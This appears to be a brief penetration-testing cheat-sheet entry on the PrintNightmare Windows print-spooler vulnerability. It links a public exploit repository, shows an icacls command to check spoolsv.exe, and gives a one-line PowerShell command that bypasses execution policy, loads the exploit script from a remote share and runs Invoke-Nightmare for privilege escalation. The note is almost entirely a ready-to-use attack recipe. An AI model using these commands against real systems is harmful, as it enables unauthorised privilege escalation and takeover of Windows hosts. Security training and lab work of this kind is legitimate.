PrintNightmare
<https://github.com/calebstewart/CVE-2021-1675>

Enumerate spoolsv. It's usually located here:
icacls.exe "C:\Windows\System32\spoolsv.exe"

powershell -ep bypass . \10.13.31.108\share\CVE-2021-1675.ps1;Invoke-Nightmare 
![unnamed_4418f919948d490aa2c99536e80a7030](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Attacks/PrintNightmare/{{notename}}-202605011742.png)
